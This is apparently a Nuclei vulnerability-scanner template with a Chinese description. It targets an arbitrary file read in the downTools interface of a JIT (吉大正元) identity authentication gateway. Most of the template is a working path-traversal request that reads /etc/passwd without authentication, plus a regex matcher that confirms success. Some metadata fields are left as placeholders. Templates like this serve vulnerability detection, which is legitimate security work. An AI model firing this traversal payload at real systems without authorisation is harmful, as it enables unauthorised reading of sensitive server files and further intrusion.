id: jit-pnx-portal-downTools-lfi

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 吉大正元身份认证网关 downTools 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。
  reference:
    - https://github.com/wy876/POC/commit/17fce9e8a8e4c711753f586f24a2b8351f367aee#diff-15f087be5009ce781ba822659a015b2d927117e6e50bdb589a57515ea5d29236R14
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd"

    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"


